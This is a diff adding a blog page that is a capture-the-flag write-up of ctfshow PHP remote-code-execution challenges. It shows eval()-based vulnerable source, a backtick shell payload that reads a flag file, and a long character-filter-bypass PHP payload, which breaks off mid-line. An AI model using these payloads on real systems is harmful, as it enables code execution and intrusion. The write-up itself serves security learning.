@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="lhb">
+    
+    <title>
+        
+            RCE极限挑战 |
+        
+        Jerem1ah&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/fontawesome/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/brands.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.svg","favicon":"/images/logo.svg","avatar":"/images/avatar.svg","font_size":null,"font_family":null,"hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":false,"preload":false},"code_copy":{},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":false,"wordcount":false,"min2read":false},"img_align":"left","copyright_info":false},"version":"3.5.2"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Jerem1ah&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">LINKS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">RCE极限挑战</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">lhb</span>
+                            
+                                <span class="author-label">Lv1</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2022-11-21 19:50:35</span>
+        <span class="mobile">2022-11-21 19:50</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2022-11-22 15:17:03</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/web/">web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                <h1 id="RCE极限挑战"><a href="#RCE极限挑战" class="headerlink" title="RCE极限挑战"></a>RCE极限挑战</h1><p><a class="link"   target="_blank" rel="noopener" href="https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah" >https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="RCE挑战1"><a href="#RCE挑战1" class="headerlink" title="RCE挑战1"></a>RCE挑战1</h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;括号&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;点&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>题解：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="keyword">echo</span> `ls;cd /;ls;cat f1agaaa;`;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../images/RCE%E6%9E%81%E9%99%90%E6%8C%91%E6%88%98/image-20221122151619154.png" alt="image-20221122151619154"></p>
+<h3 id="RCE挑战2"><a href="#RCE挑战2" class="headerlink" title="RCE挑战2"></a>RCE挑战2</h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>过程：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">！$ <span class="string">&#x27; () + , . ; = / _[]</span></span><br></pre></td></tr></table></figure>
+
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.wolai.com/2awjzT8sBkbf5RC7vBwUdM" >过程1-assert<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.wolai.com/mPAbzCatPUNxF4ijd7cT7a" >思路1-assert<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.wolai.com/cWCidigKPrgoLdheZEAbEo" >思路2-eval<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.wolai.com/6Th12Vx8qNHV6xFbfbJcXj" >思路3-phpinfo<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.wolai.com/fh2WhPr6qqQCLuAPhWPPSo" >python脚本<i class="fas fa-external-link-alt"></i></a></p>
+<p>题解：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>[]=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>.<span class="string">&#x27;&#x27;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$___</span>=<span class="string">&#x27;&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=<span class="variable">$$____</span>;(<span class="variable">$___</span>)(<span class="variable">$_</span>[_]);</span><br><span class="line">ctf_show=%<span class="number">24</span>_%<span class="number">5</span>B%<span class="number">5</span>D%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>_.<span class="string">&#x27;&#x27;</span>%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">5</span>B<span class="string">&#x27;!&#x27;</span>%<span class="number">3</span>D%<span class="number">3</span>D<span class="string">&#x27;%24&#x27;</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">3</span>D<span class="string">&#x27;&#x27;</span>%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span 